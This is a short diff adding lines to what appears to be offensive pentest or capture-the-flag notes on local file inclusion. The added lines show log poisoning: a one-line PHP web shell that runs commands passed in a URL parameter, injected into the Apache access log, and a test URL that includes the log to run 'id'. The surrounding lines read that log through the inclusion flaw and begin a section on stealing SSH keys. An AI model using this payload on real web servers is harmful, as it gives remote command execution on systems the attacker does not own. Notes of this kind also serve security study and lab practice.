@@ -72,6 +72,15 @@ Then check it with curl
 ```
 curl "http://target/index.php?page=/var/log/apache2/access.log"
 ```
+Then you can log posion it:
+```
+<?php system($_GET['cmd']); ?>
+```
+Test it:
+```
+http://target/index.php?page=/var/log/apache2/access.log&cmd=id
+```
+
 ### Ways to get ssh
 To get the ssh keys:
 ```
